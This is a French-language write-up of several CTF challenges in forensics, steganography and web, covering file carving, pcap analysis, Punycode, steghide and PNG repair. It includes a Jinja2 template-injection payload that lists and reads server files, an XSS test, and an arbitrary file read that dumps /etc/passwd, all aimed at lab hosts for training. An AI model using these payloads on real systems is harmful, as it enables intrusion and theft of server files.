* * * * *

                            Nom de domaine Etrange - Forensic

* * * * *

Enoncé: Lors de l'investigation au domicile du gayeman DJAKPATAGLO, nos agents sont tombés sur le nom de domaine suivant: xn--ctf\_wookpo-5he.com. Aidez les à retrouver le nom de domaine original que le gayeman a enregistré.

Le but est donc de retrouver l'original du nom de domaine enrégistré. Le préfixe de ce nom de domaine commence par xn-- . so let google it(allons voir ce que google peut nous donner comme information.

En faisant une petite recherche google nous tomber un article de Wikipedia qui dit de quoi il s'agit. Selon Wikipedia:

""" Un nom de domaine internationalisé est un nom de domaine Internet qui peut contenir des caractères non définis par le standard ASCII. Parmi ces caractères, on trouve notamment les lettres accentuées courantes dans de nombreuses langues européennes, ainsi que d'autres caractères n'appartenant pas à l'alphabet latin.Plusieurs registres de noms de domaine autorisent aujourd'hui les noms de domaine internationalisés, par exemple .de (Allemagne), .eu (Europe) """

""" Le standard définissant les noms de machines (RFC 11232) ne considère qu'un nombre très limité de caractères (sous-ensemble ASCII). D'où le principe du protocole IDNA (Internationalized Domain Names in Applications, RFC 58903) : les noms de domaine internationalisés sont convertis dans un nom de domaine ASCII (format Punycode). Par exemple, www.académie-française.fr sera converti en www.xn--acadmie-franaise-npb1a.fr."""

Nous savons maintenant que nous devons convenir le domaine xn--ctf\_wookpo-5he.com en son original. Pour cela nous avons utilisé "Punycode converter".

Punycode est une syntaxe de codage définie dans la RFC 3492 et conçue pour être utilisée en adéquation avec les noms de domaine internationalisés dans les applications les supportant. En utilisant le site https://www.punycoder.com/ nous avons pu retrouver le vrai nom de domaine: ctf\_woɖokpo.com. Bingo voilà notre flag.

* * * * *

                               One in a million - Forensic                                            

* * * * *

Enoncé: Télécharge le fichier et trouve la flag.

Le but est donc de trouver le flag de validation

Apres avoir téléchargé le fichier, et extrait avec `tar xf file` on voit que l'archive contenait une image chal.img

Examinons le contenu avec `binwalk`:

\$ binwalk chal.img

DECIMAL HEXADECIMAL DESCRIPTION
-------------------------------

2121728 0x206000 Zip archive data, at least v1.0 to extract, name: one\_in\_a\_million/ 2121803 0x20604B Zip archive data, at least v1.0 to extract, compressed size: 14, uncompressed size: 14, name: one\_in\_a\_million/212 2121895 0x2060A7 Zip archive data, at least v1.0 to extract, compressed size: 14, uncompressed size: 14, name: one\_in\_a\_million/211 2121987 0x206103 Zip archive data, at least v1.0 to extract, compressed size: 14, uncompressed size: 14, name: one\_in\_a\_million/210 2122079 0x20615F Zip archive data, at least v1.0 to extract, compressed size: 13, uncompressed size: 13, name: one\_in\_a\_million/21 .................................................... .................................................... ...........................

2213226 0x21C56A Zip archive data, at least v1.0 to extract, compressed size: 14, uncompressed size: 14, name: one\_in\_a\_million/908 2213318 0x21C5C6 Zip archive data, at least v1.0 to extract, compressed size: 14, uncompressed size: 14, name: one\_in\_a\_million/907 2213410 0x21C622 Zip archive data, at least v1.0 to extract, compressed size: 14, uncompressed size: 14, name: one\_in\_a\_million/906 2213502 0x21C67E Zip archive data, at least v1.0 to extract, compressed size: 14, uncompressed size: 14, name: one\_in\_a\_million/905 2303574 0x232656 End of Zip archive, footer length: 22

On remarque que l'image contient une archive qui contient d'autre archives. Nous allons l'extraire avec l'outil `dd`:

\$ dd if=chal.img bs=1 skip=2121728 of=zoo.zip 3018131 octets (3,0 MB, 2,9 MiB) copiés, 7 s, 431 kB/s 3121152+0 enregistrements lus 3121152+0 enregistrements écrits 3121152 octets (3,1 MB, 3,0 MiB) copiés, 7,23628 s, 431 kB/s

On ouvre l'archive zoo.zip, il contient assez de fichiers. Essayons de rechercher le mot clé CTF à l'interieur: \$ strings zoo.zip | grep CTF CTF\_FOuineURDeCLes

Bingo!! Voila donc le flag CTF\_FOuineURDeCLes.

* * * * *

                            Insecure Protocol - Forensic

* * * * *

Enoncé: Aucun

Dans ce challenge il s'agira d'analyser le fichier capture.pcap afin de trouver le flag.

On ouvre le fichier avec Wireshake. On analyse le trames du protocol HTTP( le protocole non sécurisé):

On remarque une requete POST:

POST /thatoneyes/action\_page.php HTTP/1.1 Host: guidos.000webhostapp.com Connection: keep-alive Content-Length: 50 Cache-Control: max-age=0 Origin: http://guidos.000webhostapp.com Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Referer: http://guidos.000webhostapp.com/thatoneyes/xafezjfgeg.html Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9

uname=admin&psw=CTF\_forensicinvestigat&remember=onHTTP/1.1 200 OK

On a le parametre psw qui est egale au flag: CTF\_forensicinvestigat Bingo on peut valider l'epreuve.

* * * * *

                        Covert Channel - Forensic

* * * * *

Enoncé: Le gayeman DJAKPAGLO est maintenant aux mains de l'OCRC. Mais Il semble que DJAKPATAGLO ait des espions au sein du bjCSIRT. Ces derniers arrivent à contourner les mesures de sécurité mises en place pour exfiltrer des données vers leur chef en prison. Le SOC du bjCSIRT a répéré cela à travers une capture réseau, qu'il vous envoie pour analyse.

Le but est d'analyser la capture réseau.

En analysant la capture réseau, nous sommes tombé sur des paquets DNS contenant apparemment des hashs suivies de ".cyber.hackirlab.local" ce qui attire notre attention. Nous allons les extraires:

\$ tshark -r capture.pcap -Y dns 2793 86.754401 192.168.56.101 → 192.168.56.110 DNS 165 Standard query 0xfe9c A 4c6f72656d20697073756d20646f6c6f722073697420616d65742c20636f.cyber.hackirlab.local OPT 2794 86.754679 192.168.56.110 → 192.168.56.101 DNS 235 Standard query response 0xfe9c No such name A 4c6f72656d20697073756d20646f6c6f722073697420616d65742c20636f.cyber.hackirlab.local SOA hackirlab.bj.hackirlab.local OPT 2795 86.810865 192.168.56.101 → 192.168.56.110 DNS 165 Standard query 0x1210 A 6e73656374657475722061646970697363696e6720656c69742c20736564.cyber.hackirlab.local OPT 2796 86.811106 192.168.56.110 → 192.168.56.101 DNS 235 Standard query response 0x1210 No such name A 6e73656374657475722061646970697363696e6720656c69742c20736564.cyber.hackirlab.local SOA hackirlab.bj.hackirlab.local OPT 2797 86.849345 192.168.56.101 → 192.168.56.110 DNS 165 Standard query 0x1ef1 A 20646f20656975736d6f642074656d706f7220696e6369646964756e7420.cyber.hackirlab.local OPT 2798 86.849595 192.168.56.110 → 192.168.56.101 DNS 235 Standard query response 0x1ef1 No such name A 20646f20656975736d6f642074656d706f7220696e6369646964756e7420.cyber.hackirlab.local SOA hackirlab.bj.hackirlab.local OPT 2799 86.880560 192.168.56.101 → 192.168.56.110 DNS 165 Standard query 0x0a85 A 7574206c61626f726520657420646f6c6f7265206d61676e6120616c6971.cyber.hackirlab.local OPT 2800 86.880743 192.168.56.110 → 192.168.56.101 DNS 235 Standard query response 0x0a85 No such name A 7574206c61626f726520657420646f6c6f7265206d61676e6120616c6971.cyber.hackirlab.local SOA hackirlab.bj.hackirlab.local OPT 2801 86.911281 192.168.56.101 → 192.168.56.110 DNS 165 Standard query 0x9521 A 75612e20557420656e696d206164206d696e696d2076656e69616d2c2071.cyber.hackirlab.local OPT 2802 86.911499 192.168.56.110 → 192.168.56.101 DNS 235 Standard query response 0x9521 No such name A 75612e20557420656e696d206164206d696e696d2076656e69616d2c2071.cyber.hackirlab.local SOA hackirlab.bj.hackirlab.local OPT ............................................................................... ................................................................................... .................................................................................. .......................................................................... 2819 87.210762 192.168.56.101 → 192.168.56.110 DNS 165 Standard query 0x9bc9 A 6f6e2070726f6964656e742c2073756e7420696e2063756c706120717569.cyber.hackirlab.local OPT 2820 87.210958 192.168.56.110 → 192.168.56.101 DNS 235 Standard query response 0x9bc9 No such name A 6f6e2070726f6964656e742c2073756e7420696e2063756c706120717569.cyber.hackirlab.local SOA hackirlab.bj.hackirlab.local OPT 2821 87.253293 192.168.56.101 → 192.168.56.110 DNS 165 Standard query 0x2f0d A 206f666669636961206465736572756e74206d6f6c6c697420616e696d20.cyber.hackirlab.local OPT 2822 87.253507 192.168.56.110 → 192.168.56.101 DNS 235 Standard query response 0x2f0d No such name A 206f666669636961206465736572756e74206d6f6c6c697420616e696d20.cyber.hackirlab.local SOA hackirlab.bj.hackirlab.local OPT 2823 87.280760 192.168.56.101 → 192.168.56.110 DNS 135 Standard query 0x2655 A 696420657374206c61626f72756d0a.cyber.hackirlab.local OPT 2824 87.280966 192.168.56.110 → 192.168.56.101 DNS 205 Standard query response 0x2655 No such name A 696420657374206c61626f72756d0a.cyber.hackirlab.local SOA hackirlab.bj.hackirlab.local OPT

Maintenant nous allons essayer de decoder tous les hashs extraits.

* * * * *

                        Photo de famille - Steganography

* * * * *

Enoncé: Un souvenir inoubliable!

Une image est mise à notre disposition. Nous devons extraires les données cachées à l'intérieur.

Essayons d'avoir des infos sur l'image:

\$ steghide info amazones.jpg "amazones.jpg": format: jpeg capacité: 3,6 KB Essayer d'obtenir des informations à propos des données incorporées ? (o/n) o Entrez la passphrase: (nous validons juste) fichier � inclure "flag.txt": taille: 23,0 Byte cryptage: rijndael-128, cbc compression: oui

Nous remarquons qu'il y a un fichier flag.txt caché à l'intérieur, nous allons l'extraire:

\$ steghide --extract -sf amazones.jpg Entrez la passphrase: (nous validons un mot de passe vide) Ecriture des données extraites dans "flag.txt". On ouvre le fichier flag.txt et bingo nous avons le flag: CTF\_YOUROCKTAKEYOURFLAG

* * * * *

                              Que faire - Web

* * * * *

Enoncé: Pour défendre notre cyber-contrée, les cyber-amazones devaient choisir la bonne méthode. http://hackerlab.bj:8001/web01/web01\_sqfrs35\_quefaire.php

Le but est donc de trouver la bonne méthode pour exécuter la requête et obtenir le flag. Pour modifier la methode de la requête, nous pouvons utiliser un programme rest client (insomnia, postman) ou burpsuite pour le moment insomnia fera l'affaire. Le nom du challenge nous fait penser à la methode OPTIONS alors nous allons l'utiliser pour voir.

Bingo le flag est la : CTF\_34GFGLFRFE343432323R2

* * * * *

                            Javascript 2/2 - Web

* * * * *

Enoncé: http://hackerlab.bj:8001/web05/web05\_eterfrgtrhtrh.html

En ouvrant ce lien dans un nouvel onglet celui ci présente une page vide. En cherchant à voir le code source de la page, nous tombons sur du javascript pas clair:

\(=~[];\)={***:++\(,\)\[$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_\]:({}+"")[\$],\[_$:($[$]+"")[$],_\]:++\(,\)\[_:(!""+"")[$],$__:++$,$_$:++$,\]**:({}+"")[\$],\[_:++$,\]\(:++\),\(___:++\),\(__\):++\(};\).\(_=(\).\(_=\)+"")[\(.\)\_\$]+(\(._\)=\(.\)*[\(.__\)])+(\(.\)\(=(\).\(+"")[\).**\(])+((!\))+"")[\(._\)\$]+(\(.__=\).\(_[\).\[_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.\]=\(.\)+(!""+"")[\(._\)\$]+\(.__+\).*+\(.\)+\(.\)\(;\).\(=(\).***)[\(.\)\_][\(.\)\_];\(.\)(\(.\)(\(.\)\(+"\""+"//"+\).\[__+$._$+"\\"+$.__$+$.$_$+$.\]*+"\\"+\(.__\)+\(.\)\(_+\).*\[+$._$+(![]+"")[$._$_]+$.\]\(_+"."+(![]+"")[\).*\(_]+\).*\(+"\\"+\).**\(+\).\(__+\).\[$+"(\\\"\\"+$.__$+$.___+$._\]+"\\"+\(.__\)+\(._\)*+\(.\)**+"\\"+\(.__\)+\(.___+\).\[_+"_\\"+$.__$+$.__$+$._$_+$.$_$_+"\\"+$.__$+$.\]*+\(.\)\(_+\).\(_\)*+"\\"+\(.__\)+\(.\)\(_+\).*\[+$.\]**+"\\"+\(.__\)+\(.\)\(_+\).*\(_+"\\"+\).**\(+\).\(_\)+\(.__\)+"\\"+\(.__\)+\(.\)\(_+\).***+\(.__+"\\"+\).**\(+\).***+\(.\)*\(+"\\"+\).**\(+\).\(_\)+\(.\)\(_+\).\[__+$._$+$.\]*\(+"\\"+\).**\(+\).\(_\)+\(.__\)+"\\"+\(.__\)+\(.\)*\(+\).\[_+"\\"+$.__$+$.$__+$.\]\(+"\\"+\).**\(+\).**\(+\).**\(+"\\"+\).**\(+\).\[_+$._\]+"\\"+\(.__\)+\(.__\)+\(.\)\(_+\).*\(+\).**+"\\"+\(.__\)+\(.\)*\(+\).***+"\\"+\(.__\)+\(.\)*\(+\).**\(+"\\"+\).**\(+\).\(_\)+\(.\)\(_+"\\"+\).**\(+\).\(__+\).\[$+"\\"+$.__$+$.___+$.\]*+\(._\)+"\\"+\(.__\)+\(.\)\(_+\).*\(_+"\\"+\).\_\_\(+\).\_\($+\).\_\_\(+\).*\(+\).*+"\\");"+""")())();

Nous allons le decoder avec le site https://lelinhtinh.github.io/de4js/ ce qui nous donne: //console.log("CTF\_JavascriptEncodingIsNothingForYou");

Bingo nous avons le flag: CTF\_JavascriptEncodingIsNothingForYou

* * * * *

                            Agent of OCRC- Forensic

* * * * *

Enoncé: Au cours d'une investigation, les agents de l'OCRC (Office Central de Répression de la Cybercriminalité) ont récupéré un ordinateur. Après des fouilles, il semble que le suspect soupçonné de pédophilie et de détention d'images à caractère pédopornographique ait effacé les images compromettantes. Néanmoins, les agents de l'OCRC ont pu récupéré un fichier crucial. Aide-les dans leur enquête, cyber-amazone.

Le but de cette épreuve est d'aider les agents de l'OCRC dans leur enquête en investiguant le fichier. Inspectons le fichier avec binwalk:

\$ binwalk file

DECIMAL HEXADECIMAL DESCRIPTION
-------------------------------

2072 0x818 JPEG image data, JFIF standard 1.01

Nous pouvons remarquer la présence d'un format de fichier JPEG à l'intérieur. Nous allons donc l'extraire pour voir:

\$ dd bs=1 skip=2072 if=file\_agent\_ocrc \> foo.jpeg 3048+0 enregistrements lus 3048+0 enregistrements écrits 3048 octets (3,0 kB, 3,0 KiB) copiés, 0,0110219 s, 277 kB/s

Maintenant nous ouvrons l'image foo.jpeg extrait et bingo nous avons le flag: CTF\_MouisTuEsUnVraiguerrier

* * * * *

                        Fichier Corrompu -Stéganographie

* * * * *

Enoncé: Les agents de DJAKPATAGLO ont trouvé une nouvelle astuce: corrompre des fichiers pour exfiltrer des données. L'astuce a été encore une fois découverte par le bjCSIRT qui sollicite votre expertise pour lire le contenu de ce fichier.

Le but ici est d'arriver à lire le contenu du fichier corrompu.

Nous téléchargeons donc le fichier. Il s'agit d'un fichier .png corrompu. Grâce à l'outil pngcheck on vérifie que l'image est bien corrompu: \$ pngcheck -v chal.png File: chal.png (3647 bytes) this is neither a PNG or JNG image nor a MNG stream ERRORS DETECTED in chal.png

Le fichier est bien corrompu. Nous allons essayer de le réparer avec l'outil PCRT (PNG Check & Repair Tool). C'est un script python qui permet de verifier si une image png est correct et qui fix l'erreur dans le cas contraire:

\$ python PCRT.py -v -i chal.png

     ____   ____ ____ _____ 
    |  _ \ / ___|  _ \_   _|
    | |_) | |   | |_) || |  
    |  __/| |___|  _ < | |  
    |_|    \____|_| \_\|_|  

    PNG Check & Repair Tool 

Project address: https://github.com/sherlly/PCRT Author: sherlly Version: 1.1

[Detected] Wrong PNG header! File header: 90514E470D0A1A0A Correct header: 89504E470D0A1A0A [Notice] Auto fixing? (y or n) [default:y] y [Finished] Now header:89504E470D0A1A0A [Finished] Correct IHDR CRC (offset: 0x1D): 3EF3D125 [Finished] IHDR chunk check complete (offset: 0x8) [Finished] Correct IDAT chunk data length (offset: 0x84 length: DA3) [Finished] Correct IDAT CRC (offset: 0xE2F): 7F3128C0 [Finished] IDAT chunk check complete (offset: 0x84) [Finished] Correct IEND chunk [Finished] IEND chunk check complete [Finished] PNG check complete [Notice] Show the repaired image? (y or n) [default:n] n

Nous ouvrons le fichier image réparé et Bingo on peut voir le flag au bas de l'image: flag: CTF\_Amazone\_Slayer

* * * * *

                            Ginger Oh Jinja!

* * * * *

Enoncé: http://hackerlab.bj:5000/

Ouvrons l'url dans un nouvel onglet. Il y a un formulaire sur la page nous demandant notre code name. Quand on rentre un mot au hasard, ça a l'air de nous reformater cela. essayons un code javascript comme
<script> alert("hallo")</script> 
pour voir. On a effectivement notre alert qui s'affiche. Cela nous fais donc penser à une faille XSS. Peut être aussi avec du code Jinja2, on essaie d'injecter: {{ 5\*5 }}

Et oui ça marche, nous avons affaire à du SST Injection (Server Side Template Injection). Essayons de lister les fichiers contenus dans le répertoire courant du code source du serveur. Nous allons injecter:

{{url\_for.**globals**.os.**dict**.listdir('.')}}

Nous avons ceci à l'écran:

Hello ['frferfrflag.txt', 'requirements.sh', 'server.py', 'run.sh']!

Nous avons la liste des fichiers contenus dans lle répertoire courant. Le fichier frferfrflag.txt attire notre attention, il pourrait contenir le flag. Nous allons lire son contenu. Injectons ce code:

{{url\_for.**globals**.**builtins**.open('frferfrflag.txt').read()}}

Réponse: Hello CTF\_TemplateBestInjector ! Et bingo nous avons le flag: CTF\_TemplateBestInjector !

* * * * *

                            File Reader - Web

* * * * *

Enoncé: Recherche et lis le fichier flag.txt http://51.91.120.156/rumble/

Le but est donc de retrouver le fichier flag.txt et de le lire.

En ouvrant le lien nous voyons un formulaire nous demandant d'entrer le nom du fichier à lire. Essayons d'entrer /etc/passwd pour lire le contenu:

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin \_apt:x:100:65534::/nonexistent:/usr/sbin/nologin

Essayons maintenant de lire /etc/flag.txt: ZGF0YTppbWFnZS9wbmc7YmFzZTY0LGlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFvQUFBQUhnQ0FZQUFBQTEwZHprQUFBQmhXbERRMUJKUTBNZ2NISnZabWxzWlFBQUtKRjlrVDFJdzBBWWh0K21Ta1VyRG5ZUWNjaFFkYkVnS3VLb1ZTaENoVkFydE9wZ2N1a2ZOR2xJVWx3Y0JkZUNneitMVlFjWFoxMGRYQVZCOEFmRXhkVkowVVZLL0M0cHRJang0TzRlM3Z2ZWw3dnZBS0ZlWnByVk1RNW91bTJtRW5FeGsxMFZRNi9vUVJnUldrZGxaaGx6a3BTRTcvaTZSNER2ZHpHZTVWLzM1K2hWY3hZREFpTHhMRE5NbTNpRGVIclROamp2RTBkWVVWYUp6NG5IVExvZzhTUFhGWS9mT0JkY0ZuaG14RXluNW9ranhHS2hqWlUyWmtWVEk1NGlqcXFhVHZsQ3htT1Y4eFpuclZ4bHpYdnlGNFp6K3NveTEya09JWUZGTEVHQ0NBVlZsRkNHalJqdE9pa1dVblFlOS9FUHVuNkpYQXE1U21Ea1dFQUZHbVRYRC80SHYzdHI1U2NudktSd0hPaDhjWnlQWVNDMEN6UnFqdk45N0RpTkV5RDRERnpwTFgrbERzeDhrbDVyYWRFam9HOGJ1TGh1YWNvZWNMa0RERHdac2ltN1VwQ21rTThENzJmMFRWbWcveGJvWHZQNjFqekg2UU9RcGw0bGI0Q0RRMkNrUU5uclB1L3VhdS9idnpYTi92MEFVQWR5bVZKQnZSa0FBQUFHWWt0SFJBRC9BUDhBLzZDOXA1TUFBQUFKY0VoWmN3QUFDeE1BQUFzVEFRQ2FuQmdBQUFBSGRFbE5SUWZqQ3d3VURSSThPa21NQUFBQUdYUkZXSFJEYjIxdFpXNTBBRU55WldGMFpXUWdkMmwwYUNCSFNVMVFWNEVPRndBQUdoVkpSRUZVZU5ydDNYbVVsWFhoeC9IUEtMS0lLRkdCUjNIZmNBbE5KS0VSd3kwT2tRZERUVVVSUWpFeVJNTThnb29MWVhyRUxVWE5CUmNJam1VS1pFcUtJb3FpU2U0S0NFaG1nd2tWY0dSK0lwdjM5MGZuVHNBc0REZ1M0T3QxenZ6RFBQZTU5OW51ZmMvemZPOURTYUZRS0FRQWdDK05yYXdDQUFBQkNBQ0FBQVFBUUFBQ0FDQUFBUUFRZ0FBQUNFQUFBQVFnQUFBQ0VBQUFBUWdBZ0FBRUFFQUFBZ0FnQUFFQUVJQUFBQUlRQUFBQkNBQ0FBQVFBUUFBQ0FDQUFBUUFRZ0FBQUNFQUFBQVFnQUFBQ0VBQUFBUWdBZ0FBRUFFQUFBZ0FnQUFFQUVJQUFBQUlRQUFBQkNBQ0FBQVFBUUFBQ0FDQUFBUUFRZ0FBQUNFQUFBQVFnQUFBQ0VBQUFBUWdBZ0FBRUFFQUFBZ0FnQUFFQUJDQUFBQUlRQUFBQkNBQ0FBQVFBUUFBQ0FDQUFBUUFRZ0FBQUNFQUFBQVFnQUFBQ0VBQUFBUWdBZ0FBRUFFQUFBZ0FnQUFFQUJDQUFBQUlRQUFBQkNBQ0FBQVFBUUFBQ0FDQUFBUUFRZ0FBQUNFQUFBQVFnQUFBQ0VBQUFBUWdBZ0FBRUFFQUFBZ0FJUUFBQUJDQUFBQUlRQUFBQkNBQ0FBQVFBUUFBQ0FDQUFBUUFRZ0FBQUNFQUFBQVFnQUFBQ0VBQUFBUWdBZ0FBRUFFQUFBZ0FJUUFBQUJDQUFBQUlRQUFBQkNBQ0FBQVFBUUFBQ0FDQUFBUUFRZ0FBQUNFQUFBQVFnQUFBQ0VBQUFBUWdBZ0FBRUFFQUFBZ0FJUUFBQUJDQUFBQUlRQUFBQkNBQ0FBQVFBUUFBQ0FDQUFBUUFRZ0FBQUNFQUFBQVFnQUFBQ0VBQUFBUWdBZ0FBRUFCQ0FBQUFJUUFBQUJDQUFBQUlRQUFBQkNBQ0FBQVFBUUFBQ0FDQUFBUUFRZ0FBQUNFQUFBQVFnQUFBQ0VBQUFBUWdBZ0FBRUFCQ0FBQUFJUUFBQUJDQUFBQUlRQUFBQkNBQ0FBQVFBUUFBQ0FDQUFBUUFRZ0FBQUNFQUFBQVFnQUFBQ0VBQUFBUWdBSUFBQkFCQ0FBQUFJUUFBQUJDQUFBQUlRQUFBQkNBQ0FBQVFBUUFBQ0FDQUFBUUFRZ0FBQUNFQUFBQVFnQUFBQ0VBQUFBUWdBSUFBQkFCQ0FBQUFJUUFBQUJDQUFBQUlRQUFBQkNBQ0FBQVFBUUFBQ0FDQUFBUUFRZ0FBQUNFQUFBQVFnQUFBQ0VBQkFBQUlBSUFBQkFCQ0FBQUFJUUFBQUJDQUFBQUlRQUFBQkNBQ0FBQVFBUUFBQ0FDQUFBUUFRZ0FBQUNFQUFBQVFnQUFBQ0VBQkFBQUlBSUFBQkFCQ0FBQUFJUUFBQUJDQUFBQUlRQUFBQkNBQ0FBQVFBUUFBQ0FDQUFBUUFRZ0FBQUNFQUFBQVFnQUFBQ0VBQkFBQUlBSUFBQkFCQ0FBQUFJUUFBQUJDQUFBQUlRQUFBQkNBQ0FBQVFBUUFBQ0FDQUFBUUFRZ0FBQUNFQUFBQVFnQUlBQUJBQkFBQUlBSUFBQkFCQ0FBQUFJUUFBQUJDQUFBQUlRQUFBQkNBQ0FBQVFBUUFBQ0FDQUFBUUFRZ0FBQUNFQUFBQVFnQUlBQUJBQkFBQUlBSUFBQkFCQ0FBQUFJUUFBQUJDQUFBQUlRQUFBQkNBQ0FBQVFBUUFBQ0FDQUFBUUFRZ0FBQUNFQUFBQUVJQUlBQUJBQkFBQUlBSUFBQkFCQ0FBQUFJUUFBQUJDQUFBQUlRQUFBQkNBQ0FBQVFBUUFBQ0FDQUFBUUFRZ0FBQUNFQUFBQUVJQUlBQUJBQkFBQUlBSUFBQkFCQ0FBQUFJUUFBQUJDQUFBQUlRQUFBQkNBQ0FBQVFBUUFBQ0FDQUFBUUFRZ0pCWnMyWmw1TWlSK2ZHUGY1d2pqamdpN2R1M3ovbm5uNTl4NDhabDBhSkZTWkpseTVhbHBLUmt2WCtlZXVxcEpFbi8vdjNYT2UzcnI3OWVKOHRUS0JUU3ExZXZsSlNVcEZ1M2J2bnNzODhxVFROeTVNaVVsSlJrekpneHRacm5JNDg4a3BLU2t0eDExMTFWUHQ4YmI3eVIyMjY3TGFlZGRsb09QUERBZlAvNzM4OFZWMXlScDU1NktrdVhMcTEydnNYMU1tUEdqQ3IvdmZpei9mYmI1OGdqajB5UEhqMXkvZlhYWjhLRUNWbXdZRUdOcjdtNmVhOXIrdlhaUm1zL3g2SkZpMUpTVXBKZGR0a2x5NWN2ci9KNW5uMzIyWXI1ZmZqaGgxVk9NM3YyN0pTVWxPU1VVMDdab0dXNjZxcXJVbEpTa2xkZmZYVzkxM2xkcnErU2twTE1uajE3blk4NytPQ0RjODQ1NTJUMDZOSDU1ei8vV2F2bk92REFBOU9qUjQvY2VlZWRlZSs5OTJwMVhHem9mcnE2dVhQblp2VG8wVG52dlBOeXpESEg1T0NERDg2Wlo1NlplKzY1SjIrLy9YYVZ4MXRkTHNPNmp1M3FublBzMkxFMVR2dlFRdzlWVEh2aGhSZHVsSG5WZE55Lzg4NDcxYzUvNE1DQlZlNWJkYkdkdnRRSzhDV3haTW1Td2k5KzhZdENrbXAvV3Jac1daZzRjV0poNmRLbE5VNVgzYy9FaVJNTGhVS2hjTjU1NTYxejJ0ZGVlNjFPbG12T25EbHJ6SGZHakJtVnB2bnJYLzlhU0ZJb0xTMHRMRisrdk1iNXJWeTVzdENsUzVkQ2tzS3NXYlBXK04zaXhZc0xGMTEwVVkzTDFiRmp4eXBmdytyclpmcjA2VlgrKzdwK2hnOGZYaWd2TDErdmVWZG5RN1pSVmMvUm8wZVBRcExDN05tenEzeWVtMisrdVdKK3p6NzdiSlhUUFByb280VWtoZnZ1dTIrRGx1bktLNjhzSkNtODhzb3I2NzNPNjNKOVZiWFByT3R4Qnh4d1FLWDlwVGJQOWVTVFQxYjdXai92Zmxvb0ZBcmw1ZVdGYTY2NVpwMnZvMi9mdm9XLy8vM3ZHN1MrYWxxRzJoN2IxVDNuOGNjZlgxaTVjbVdWMDYxWXNhTFFxVk9uaW1rSERCaXdVZVpWMDNGLzdybm5GbGF0V2xYbGMxeDg4Y1ZWN2x0MXNaMit6SndCNUV0aDZkS2x1ZUNDQ3pKNDhPQ1VscGJtOGNjZnp6Lys4WThzVzdZc0sxYXN5S0pGaS9MeXl5L25wSk5PeW5ISEhaZnk4dklVQ29WS1A2Kzk5bHFTNU9LTEw2N3k5OGNlZSt3YXp6dDkrdlFxcHlzVUNqbmtrRVBxWk5rbVQ1NmNKQmsrZkhpUzVPbW5uNjQwemU2Nzc1NCtmZnJraFJkZXlOdHZ2MTNqL041OTk5MDg5dGhqT2ZYVVU3UDMzbnRYL1Bzbm4zeVNjODg5TjhPR0RVdW5UcDN5M0hQUFpkR2lSVm01Y21VKytlU1R6Smd4SXdNSERzemt5WlB6bmU5OEo3Tm16VnJ2WlZsOWZhMVlzU0lmZi94eFpzMmFsUWNlZUNETm16ZFB2Mzc5Y3RGRkY5WDY3TTM2UHVlR2JLUGlObi8zM1hjci9lNnp6ejdMd3c4L25BRURCbVRmZmZldDlxenZ5eSsvbkNRNTZLQ0ROdmxqcWFiMVZTZ1VzczgrKzZ6emNaOSsrbW5tekptVGZ2MzZaZnIwNlJrd1lFQ1ZaMUJYZjh5eVpjc3liOTY4WEhmZGRVbVNNODQ0SXdzWExxejBtTHJZVDVjdVhacnp6ejgvZ3dZTlNtbHBhZjc0eHorbXJLd3NuMzc2YVZhdFdwWHk4dkxNbmowN1k4YU15WFBQUFplYmJycXBWdXVydHN1d1BzZDJWUzY1NUpJOCt1aWoxUjZETTJmT3pCTlBQSkhMTHJ0c284NnJPdTNhdGN2dHQ5OWU1Um5zZGIydjE5VjJjZ2tZdGxCanhvekppQkVqOG9NZi9DRGp4bzFMNTg2ZHMrT09PNlorL2ZxcFY2OWVtalp0bXJadDIrYkdHMi9NcEVtVFVsSlNzbGtzMTZlZmZwcGJicmtsSFRwMFNPL2V2ZE9wVTZkY2UrMjFLUzh2cnpUdHFhZWVtaVI1NG9rbmFweG44VEwybVdlZXVjWjZHRFZxVk1hTUdaTVRUend4WThhTVNZY09IZEswYWROc3ZmWFdhZFNvVVZxMWFwV2hRNGZtbGx0dXlZSUZDekpnd0lBc1c3WnNnNWV0WHIxNmFkS2tTZmJaWjUrY2VlYVptVFp0V3RxMWE1Yzc3cmdqRHovODhDYXpEWXJSOXVjLy83blM3ejc2NktOTW1USWxSeDExVkhyMDZKR3hZOGRXdWhTMWZQbnkzSGZmZlVtU3ZmYmE2MHR4UERabzBDQjc3YlZYcnJycXFyUnMyVElUSmt6SW5EbHphbnhNL2ZyMXM5Tk9PK1g4ODg5UHg0NGRzMkRCZ2lvdkNkYkZmanA2OU9pTUdERWlKNTU0WXNhUEg1OHVYYnBrNTUxM1RvTUdEYkxWVmx1bGNlUEcyWHZ2dlhQYWFhZGw2dFNwK2ZhM3YxMnI1YTd0TXF6dnNiMjI0NDgvUGtueXpEUFAxSGlNZCtuU1phUE9xenFYWDM1NWt1U21tMjdLeXBVcmEvMjRMMm83Q1VEWVFpeGN1REEvKzluUGtpUlhYMzExdnZhMXIxVTd